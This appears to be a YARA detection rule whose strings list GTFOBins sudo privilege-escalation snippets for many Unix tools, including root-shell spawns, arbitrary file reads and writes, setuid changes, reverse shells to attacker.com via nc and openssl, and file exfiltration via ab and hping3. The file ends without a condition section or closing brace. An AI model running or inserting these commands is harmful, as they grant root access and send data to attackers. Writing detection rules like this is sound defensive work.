rule GTFObins_Instructions
{
    meta:
        description = "Checks for GTFOBins functions in binaries"
        author = "Alexander Chufistov"

    strings:
        // sudo
        $gtfo_function_sudo_7z = "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n"
        $gtfo_function_sudo_aa_exec = "sudo aa-exec /bin/sh"
        $gtfo_function_sudo_ab = "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL\n"
        $gtfo_function_sudo_alpine = "LFILE=file_to_read\nsudo alpine -F \"$LFILE\"\n"
        $gtfo_function_sudo_ansible_playbook = "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF\n"
        $gtfo_function_sudo_ansible_test = "sudo ansible-test shell"
        $gtfo_function_sudo_aoss = "sudo aoss /bin/sh"
        $gtfo_function_sudo_apache2ctl = "LFILE=file_to_read\nsudo apache2ctl -c \"Include $LFILE\" -k stop\n"
        $gtfo_function_sudo_apt_1 = "sudo apt changelog apt\n!/bin/sh\n"
        $gtfo_function_sudo_apt_2 = "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n"
        $gtfo_function_sudo_apt_3 = "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"
        $gtfo_function_apt_get_1 = "sudo apt-get changelog apt\n!/bin/sh\n"
        $gtfo_function_apt_get_2 = "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n"
        $gtfo_function_apt_get_3 = "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
        $gtfo_function_sudo_ar = "TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
        $gtfo_function_sudo_aria2c = "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
        $gtfo_function_sudo_arj = "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR\n"
        $gtfo_function_sudo_arp = "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"
        $gtfo_function_sudo_as = "LFILE=file_to_read\nsudo as @$LFILE\n"
        $gtfo_function_sudo_ascii_xfr = "LFILE=file_to_read\nsudo ascii-xfr -ns \"$LFILE\"\n"
        $gtfo_function_ascii85 = "LFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode\n"
        $gtfo_function_sudo_ash = "sudo ash"
        $gtfo_function_sudo_aspell = "LFILE=file_to_read\nsudo aspell -c \"$LFILE\"\n"
        $gtfo_function_sudo_at = "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n"
        $gtfo_function_sudo_atobm = "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
        $gtfo_function_sudo_awk = "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
        $gtfo_function_sudo_aws = "sudo aws help\n!/bin/sh\n"
        $gtfo_function_sudo_base32 = "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"
        $gtfo_function_sudo_base58 = "LFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode\n"
        $gtfo_function_sudo_base64 = "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n"
        $gtfo_function_sudo_basenc = "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n"
        $gtfo_function_sudo_basez = "LFILE=file_to_read\nsudo basez \"$LFILE\" | basez --decode\n"
        $gtfo_function_sudo_bash = "sudo bash"
        $gtfo_function_sudo_batcat = "sudo batcat --paging always /etc/profile\n!/bin/sh\n"
        $gtfo_function_sudo_bc = "LFILE=file_to_read\nsudo bc -s $LFILE\nquit\n"
        $gtfo_function_sudo_bconsole = "sudo bconsole\n@exec /bin /sh\n"
        $gtfo_function_sudo_bpftrace = "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'"
        $gtfo_function_sudo_bridge = "LFILE=file_to_read\nsudo bridge -b \"$LFILE\"\n"
        $gtfo_function_sudo_bundle = "sudo bundle help\n!/bin/sh\n"
        $gtfo_function_sudo_bundler = "sudo bundler help\n!/bin/sh\n"
        $gtfo_function_sudo_busctl = "sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'\n"
        $gtfo_function_busybox = "sudo busybox sh"
        $gtfo_function_sudo_byebug = "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
        $gtfo_function_sudo_bzip2 = "LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d\n"
        $gtfo_function_sudo_c89 = "sudo c89 -wrapper /bin/sh,-s ."
        $gtfo_function_sudo_c99 = "sudo c99 -wrapper /bin/sh,-s ."
        $gtfo_function_sudo_cabal = "sudo cabal exec -- /bin/sh"
        $gtfo_function_sudo_capsh = "sudo capsh --"
        $gtfo_function_sudo_cat = "LFILE=file_to_read\nsudo cat \"$LFILE\"\n"
        $gtfo_function_sudo_cdist = "sudo cdist shell -s /bin/sh"
        $gtfo_function_sudo_certbot = "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n"
        $gtfo_function_sudo_check_by_ssh = "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
        $gtfo_function_sudo_check_cups = "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n"
        $gtfo_function_sudo_check_log = "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n"
        $gtfo_function_sudo_check_memory = "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n"
        $gtfo_function_sudo_check_raid = "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n"
        $gtfo_function_sudo_check_ssl_cert = "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n"
        $gtfo_function_sudo_check_statusfile = "LFILE=file_to_read\nsudo check_statusfile $LFILE\n"
        $gtfo_function_sudo_chmod = "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n"
        $gtfo_function_sudo_choom = "sudo choom -n 0 /bin/sh"
        $gtfo_function_sudo_chown = "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"
        $gtfo_function_sudo_chroot = "sudo chroot /\n"
        $gtfo_function_sudo_clamscan = "LFILE=file_to_read\nsudo clamscan -q -i --stdout -f $LFILE\n"
        $gtfo_function_sudo_cmp = "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l\n"
        $gtfo_function_sudo_cobc = "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"
        $gtfo_function_sudo_column = "LFILE=file_to_read\nsudo column $LFILE\n"
        $gtfo_function_sudo_comm = "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n"
        $gtfo_function_sudo_composer = "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n"
        $gtfo_function_sudo_cowsay = "TF =$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"
        $gtfo_function_sudo_cowthink = "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"
        $gtfo_function_sudo_cp_1 = "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n"
        $gtfo_function_sudo_cp_2 = "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n"
        $gtfo_function_sudo_cp_3 = "sudo cp /bin/sh /bin/cp\nsudo cp\n"
        $gtfo_function_sudo_cpan = "sudo cpan\n! exec '/bin/bash'\n"
        $gtfo_function_sudo_cpio_1 = "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n"
        $gtfo_function_sudo_cpio_2 = "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n"
        $gtfo_function_sudo_cpio_3 = "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR\n"
        $gtfo_function_sudo_cpulimit = "sudo cpulimit -l 100 -f /bin/sh"
        $gtfo_function_sudo_crash = "sudo crash -h\n!sh\n"
        $gtfo_function_sudo_crontab = "sudo crontab -e"
        $gtfo_function_sudo_csh = "sudo csh"
        $gtfo_function_sudo_csplit = "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
        $gtfo_function_sudo_csvtool = "sudo csvtool call '/bin/sh;false' /etc/passwd"
        $gtfo_function_sudo_cupsfilter = "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
        $gtfo_function_sudo_curl = "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n"
        $gtfo_function_sudo_cut = "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"
        $gtfo_function_sudo_dash = "sudo dash"
        $gtfo_function_sudo_date = "LFILE=file_to_read\nsudo date -f $LFILE\n"
        $gtfo_function_sudo_dc = "sudo dc -e '!/bin/sh'"
        $gtfo_function_sudo_dd = "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n"
        $gtfo_function_sudo_debugfs = "sudo debugfs\n!/bin/sh\n"
        $gtfo_function_sudo_dialog = "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"
        $gtfo_function_sudo_diff = "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n"
        $gtfo_function_sudo_dig = "LFILE=file_to_read\nsudo dig -f $LFILE\n"
        $gtfo_function_sudo_distcc = "sudo distcc /bin/sh"
        $gtfo_function_sudo_dmesg = "sudo dmesg -H\n!/bin/sh\n"
        $gtfo_function_sudo_dmidecode = "LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\"\n"
        $gtfo_function_sudo_dmsetup = "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"
        $gtfo_function_sudo_dnf = "sudo dnf install -y x-1.0-1.noarch.rpm\n"
        $gtfo_function_sudo_docker = "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
        $gtfo_function_sudo_dosbox = "LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
        $gtfo_function_sudo_dotnet = "sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n"
        $gtfo_function_sudo_dpkg_1 = "sudo dpkg -l\n!/bin/sh\n"
        $gtfo_function_sudo_dpkg_2 = "sudo dpkg -i x_1.0_all.deb"
        $gtfo_function_sudo_dstat = "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n"
        $gtfo_function_sudo_dvips = "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n"
        $gtfo_function_sudo_easy_install = "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"
        $gtfo_function_sudo_eb = "sudo eb logs\n!/bin/sh\n"
        $gtfo_function_sudo_ed = "sudo ed\n!/bin/sh\n"
        $gtfo_function_sudo_efax = "LFILE=file_to_read\nsudo efax -d \"$LFILE\"\n"
        $gtfo_function_sudo_elvish = "sudo elvish"
        $gtfo_function_sudo_emacs = "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
        $gtfo_function_sudo_enscript = "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"
        $gtfo_function_sudo_env = "sudo env /bin/sh"
        $gtfo_function_sudo_eqn = "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"
        $gtfo_function_sudo_espeak = "LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\"\n"
        $gtfo_function_sudo_ex = "sudo ex\n!/bin/sh\n"
        $gtfo_function_sudo_exiftool = "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n"
        $gtfo_function_sudo_expand = "LFILE=file_to_read\nsudo expand \"$LFILE\"\n"
        $gtfo_function_sudo_expect = "sudo expect -c 'spawn /bin/sh;interact'"
        $gtfo_function_sudo_facter = "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
        $gtfo_function_sudo_file = "LFILE=file_to_read\nsudo file -f $LFILE\n"
        $gtfo_function_sudo_find = "sudo find . -exec /bin/sh \\; -quit"
        $gtfo_function_sudo_fish = "sudo fish"
        $gtfo_function_sudo_flock = "sudo flock -u / /bin/sh"
        $gtfo_function_sudo_fmt = "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n"
        $gtfo_function_sudo_fold = "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n"
        $gtfo_function_sudo_fping = "LFILE=file_to_read\nsudo fping -f $LFILE\n"
        $gtfo_function_sudo_ftp = "sudo ftp\n!/bin/sh\n"
        $gtfo_function_sudo_gawk = "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
        $gtfo_function_sudo_gcc = "sudo gcc -wrapper /bin/sh,-s ."
        $gtfo_function_sudo_gcloud = "sudo gcloud help\n!/bin/sh\n"
        $gtfo_function_sudo_gcore = "sudo gcore $PID"
        $gtfo_function_sudo_gdb = "sudo gdb -nx -ex '!sh' -ex quit"
        $gtfo_function_sudo_gem = "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
        $gtfo_function_sudo_genie = "sudo genie -c '/bin/sh'"
        $gtfo_function_sudo_genisoimage = "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"
        $gtfo_function_sudo_ghc = "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
        $gtfo_function_sudo_ghci = "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
        $gtfo_function_sudo_gimp = "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
        $gtfo_function_sudo_ginsh = "sudo ginsh\n!/bin/sh\n"
        $gtfo_function_sudo_git_1 = "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help"
        $gtfo_function_sudo_git_2 = "sudo git -p help config\n!/bin/sh\n"
        $gtfo_function_sudo_git_3 = "sudo git branch --help config\n!/bin/sh\n"
        $gtfo_function_sudo_git_4 = "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n"
        $gtfo_function_sudo_git_5 = "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"
        $gtfo_function_sudo_grc = "sudo grc --pty /bin/sh"
        $gtfo_function_sudo_grep = "LFILE=file_to_read\nsudo grep '' $LFILE\n"
        $gtfo_function_sudo_gtester = "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
        $gtfo_function_sudo_gzip = "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n"
        $gtfo_function_sudo_hd = "LFILE=file_to_read\nsudo hd \"$LFILE\"\n"
        $gtfo_function_sudo_head = "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"
        $gtfo_function_sudo_hexdump = "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"
        $gtfo_function_sudo_highlight = "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"
        $gtfo_function_sudo_hping3_1 = "sudo hping3\n/bin/sh\n"
        $gtfo_function_sudo_hping3_2 = "RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\"\n"
        $gtfo_function_sudo_iconv = "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
        $gtfo_function_sudo_iftop = "sudo iftop\n!/bin/sh\n"
        $gtfo_function_sudo_install = "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"
        $gtfo_function_sudo_ionice = "sudo ionice /bin/sh"
        $gtfo_function_sudo_ip_1 = "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n"
        $gtfo_function_sudo_ip_2 = "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n"
        $gtfo_function_sudo_ip_3 = "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar\n"
        $gtfo_function_sudo_irb = "sudo irb\nexec '/bin/bash'\n"
        $gtfo_function_sudo_ispell = "sudo ispell /etc/passwd\n!/bin/sh\n"
        $gtfo_function_sudo_jjs = "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
        $gtfo_function_sudo_joe = "sudo joe\n^K!/bin/sh\n"
        $gtfo_function_sudo_join = "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n"
        $gtfo_function_sudo_journalctl = "sudo journalctl\n!/bin/sh\n"
        $gtfo_function_sudo_jq = "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n"
        $gtfo_function_sudo_jrunscript = "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
        $gtfo_function_sudo_jtag = "sudo jtag --interactive\nshell /bin/sh\n"
        $gtfo_function_sudo_julia = "sudo julia -e 'run(`/bin/sh`)'\n"
        $gtfo_function_sudo_knife = "sudo knife exec -E 'exec \"/bin/sh\"'\n"
        $gtfo_function_sudo_ksh = "sudo ksh"
        $gtfo_function_sudo_ksshell = "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
        $gtfo_function_sudo_ksu = "sudo ksu -q -e /bin/sh"
        $gtfo_function_sudo_kubectl = "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
        $gtfo_function_sudo_latex_1 = "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n"
        $gtfo_function_sudo_latex_2 = "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
        $gtfo_function_sudo_latexmk = "sudo latexmk -e 'exec \"/bin/sh\";'"
        $gtfo_function_sudo_ld_so = "sudo /lib/ld.so /bin/sh"
        $gtfo_function_sudo_ldconfig = "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n"
        $gtfo_function_sudo_less = "sudo less /etc/profile\n!/bin/sh\n"
        $gtfo_function_sudo_lftp = "sudo lftp -c '!/bin/sh'"
        $gtfo_function_sudo_links = "LFILE=file_to_read\nsudo links \"$LFILE\"\n"
        $gtfo_function_sudo_ln = "sudo ln -fs /bin/sh /bin/ln\nsudo ln\n"
        $gtfo_function_sudo_loginctl = "sudo loginctl user-status\n!/bin/sh\n"
        $gtfo_function_sudo_logsave = "sudo logsave /dev/null /bin/sh -i"
        $gtfo_function_sudo_look = "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"
        $gtfo_function_sudo_ltrace = "sudo ltrace -b -L /bin/sh"
        $gtfo_function_sudo_lua = "sudo lua -e 'os.execute(\"/bin/sh\")'"
        $gtfo_function_sudo_lualatex = "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
        $gtfo_function_sudo_luatex = "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
        $gtfo_function_sudo_lwp_download = "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"
        $gtfo_function_sudo_lwp_request = "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"
        $gtfo_function_sudo_mail = "sudo mail --exec='!/bin/sh'" 
        $gtfo_function_sudo_make = "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
        $gtfo_function_sudo_man = "sudo man man\n!/bin/sh\n"
        $gtfo_function_sudo_mawk = "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
        $gtfo_function_sudo_minicom = "sudo minicom -D /dev/null\n"
        $gtfo_function_sudo_more = "TERM= sudo more /etc/profile\n!/bin/sh\n"
        $gtfo_function_sudo_mosquitto = "LFILE=file_to_read\nsudo mosquitto -c \"$LFILE\"\n" 
        $gtfo_function_sudo_mount = "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n"
        $gtfo_function_sudo_msfconsole = "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n" 
        $gtfo_function_sudo_msgattrib = "LFILE=file_to_read\nsudo msgattrib -P $LFILE\n"
        $gtfo_function_sudo_msgcat = "LFILE=file_to_read\nsudo msgcat -P $LFILE\n" 
        $gtfo_function_sudo_msgconv = "LFILE=file_to_read\nsudo msgconv -P $LFILE\n"
        $gtfo_function_sudo_msgfilter = "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n"
        $gtfo_function_sudo_msgmerge = "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n" 
        $gtfo_function_sudo_msguniq = "LFILE=file_to_read\nsudo msguniq -P $LFILE\n"
        $gtfo_function_sudo_mtr = "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"
        $gtfo_function_sudo_multitime = "sudo multitime /bin/sh"
        $gtfo_function_sudo_mv = "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"
        $gtfo_function_sudo_mysql = "sudo mysql -e '\\! /bin/sh'"
        $gtfo_function_sudo_nano = "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"
        $gtfo_function_sudo_nasm = "LFILE=file_to_read\nsudo nasm -@ $LFILE\n"
        $gtfo_function_sudo_nawk = "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
        $gtfo_function_sudo_nc = "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n"
        $gtfo_function_sudo_ncdu = "sudo ncdu\nb\n"
        $gtfo_function_sudo_ncftp = "sudo ncftp\n!/bin/sh\n"
        $gtfo_function_sudo_neofetch = "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n"
        $gtfo_function_sudo_nft = "LFILE=file_to_read\nsudo nft -f \"$LFILE\"\n"
        $gtfo_function_sudo_nice = "sudo nice /bin/sh"
        $gtfo_function_sudo_nl = "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"
        $gtfo_function_sudo_nm = "LFILE=file_to_read\nsudo nm @$LFILE\n"
        $gtfo_function_sudo_nmap_1 = "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n"
        $gtfo_function_sudo_nmap_2 = "sudo nmap --interactive\nnmap> !sh\n"
        $gtfo_function_sudo_node = "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
        $gtfo_function_sudo_nohup = "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
        $gtfo_function_sudo_npm = "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n"
        $gtfo_function_sudo_nroff = "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"
        $gtfo_function_sudo_nsenter = "sudo nsenter /bin/sh"
        $gtfo_function_sudo_ntpdate = "LFILE=file_to_read\nsudo ntpdate -a x -k $LFILE -d localhost\n"
        $gtfo_function_sudo_octave = "sudo octave-cli --eval 'system(\"/bin/sh\")'"
        $gtfo_function_sudo_od = "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"
        $gtfo_function_sudo_openssl = "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
        $gtfo_function_sudo_openvpn_1 = "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n"
        $gtfo_function_sudo_openvpn_2 = "LFILE=file_to_read\nsudo openvpn --config \"$LFILE\"\n"
        $gtfo_function_sudo_openvt = "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF\n"
        $gtfo_function_sudo_opkg = "sudo opkg install x_1.0_all.deb\n"
        $gtfo_function_sudo_pandoc = "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\nsudo pandoc -L $TF /dev/null\n"
        $gtfo_function_sudo_paste = "LFILE=file_to_read\nsudo paste $LFILE\n"
        $gtfo_function_sudo_pdb = "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"
        $gtfo_function_sudo_pdflatex_1 = "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n"
        $gtfo_function_sudo_pdflatex_2 = "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
        $gtfo_function_sudo_pdftex = "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
        $gtfo_function_sudo_perf = "sudo perf stat /bin/sh\n"
        $gtfo_function_sudo_perl = "sudo perl -e 'exec \"/bin/sh\";'"
        $gtfo_function_sudo_perlbug = "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
        $gtfo_function_sudo_pexec = "sudo pexec /bin/sh"
        $gtfo_function_sudo_pg = "sudo pg /etc/profile\n!/bin/sh\n"
        $gtfo_function_sudo_php = "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
        $gtfo_function_sudo_pic = "sudo pic -U\n.PS\nsh X sh X\n"
        $gtfo_function_sudo_pico = "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"
        $gtfo_function_sudo_pidstat = "COMMAND=id\nsudo pidstat -e $COMMAND\n"
        $gtfo_function_sudo_pip = "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"
        $gtfo_function_sudo_pkexec = "sudo pkexec /bin/sh"
        $gtfo_function_sudo_pkg = "sudo pkg install -y --no-repo-update ./x-1.0.txz\n"
        $gtfo_function_sudo_posh = "sudo posh"
        $gtfo_function_sudo_pr = "LFILE=file_to_read\npr -T $LFILE\n"
        $gtfo_function_sudo_pry = "sudo pry\nsystem(\"/bin/sh\")\n"
        $gtfo_function_sudo_psftp = "sudo psftp\n!/bin/sh\n"
        $gtfo_function_sudo_psql = "psql\n\\?\n!/bin/sh\n"
        $gtfo_function_sudo_ptx = "LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\"\n"
        $gtfo_function_sudo_puppet = "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
        $gtfo_function_sudo_pwsh = "sudo pwsh"
        $gtfo_function_sudo_python = "sudo python -c 'import os; os.system(\"/bin/sh\")'"
        $gtfo_function_sudo_rake = "sudo rake -p '`/bin/sh 1>&0`'"
        $gtfo_function_sudo_rc = "sudo rc -c '/bin/sh'"
        $gtfo_function_sudo_readelf = "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"
        $gtfo_function_sudo_red = "sudo red file_to_write\na\nDATA\n.\nw\nq\n"
